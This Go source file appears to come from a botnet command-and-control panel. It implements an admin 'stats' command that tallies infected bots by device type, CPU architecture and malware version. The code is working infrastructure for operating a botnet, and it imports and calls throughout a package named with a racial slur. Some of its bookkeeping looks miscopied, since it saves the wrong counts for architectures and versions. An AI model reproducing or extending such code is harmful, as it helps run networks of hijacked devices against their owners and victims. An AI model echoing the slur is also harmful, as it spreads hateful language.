package admin

import (
	"advanced-telnet-cnc/packages/pflag"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	"strconv"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"stats", "bots", "botcount", "statistics"},
		Description: "Displays statistics related to the bots in the network.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) < 1 {
				return IdentifierCount(session, "")
			}

			var identifiers, arches, versions bool
			var searchQuery string

			flagSet := pflag.NewFlagSet("stats", pflag.ContinueOnError)
			flagSet.SetOutput(session.Conn)

			flagSet.BoolVarP(&identifiers, "identifiers", "i", false, "View bots by identifier. (ex. DVR)")
			flagSet.BoolVarP(&arches, "architecture", "a", false, "View bots by architecture. (ex. MIPS)")
			flagSet.BoolVarP(&versions, "versions", "v", false, "View bots by malware versions. (ex. 2.0.0)")
			flagSet.StringVarP(&searchQuery, "search", "s", "", "Search for a specific bot type.")

			err := flagSet.Parse(args)
			if err != nil {
				if err == pflag.ErrHelp {
					return nil
				}
				return session.Println(config.Red, "Could not parse command flags.")
			}

			if identifiers {
				return IdentifierCount(session, searchQuery)
			} else if arches {
				return ArchesCount(session, searchQuery)
			} else if versions {
				return VersionsCount(session, searchQuery)
			} else {
				return IdentifierCount(session, searchQuery)
			}
		},
	})
}

func IdentifierCount(session *sessions.Session, searchQuery string) error {
	for s, count := range niggers.Distribution() {
		if !strings.HasPrefix(s, searchQuery) {
			continue
		}

		old, exists := session.OldDistribution[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	session.OldDistribution = niggers.Distribution()

	return nil
}

func ArchesCount(session *sessions.Session, searchQuery string) error {
	for s, count := range niggers.Arches() {
		if !strings.HasPrefix(s, searchQuery) {
			continue
		}

		old, exists := session.OldArches[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	for key, value := range niggers.Distribution() {
		session.OldArches[key] = value
	}

	return nil
}

func VersionsCount(session *sessions.Session, searchQuery string) error {
	for s, count := range niggers.Versions() {
		if !strings.HasPrefix(s, searchQuery) {
			continue
		}

		old, exists := session.OldVersions[s]
		if !exists {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		difference := count - old
		if difference == 0 {
			session.Printf("%s: %s\r\n", s, strconv.Itoa(count))
			continue
		}

		differenceSymbol := "\u001B[92m+"
		if difference < 0 {
			differenceSymbol = "\u001B[91m-"
			difference *= -1
		}

		session.Printf("%s: %s (%s\x1b[97m)\r\n", s, strconv.Itoa(count), differenceSymbol+strconv.Itoa(difference))
	}

	for key, value := range niggers.Distribution() {
		session.OldVersions[key] = value
	}
	return nil
}
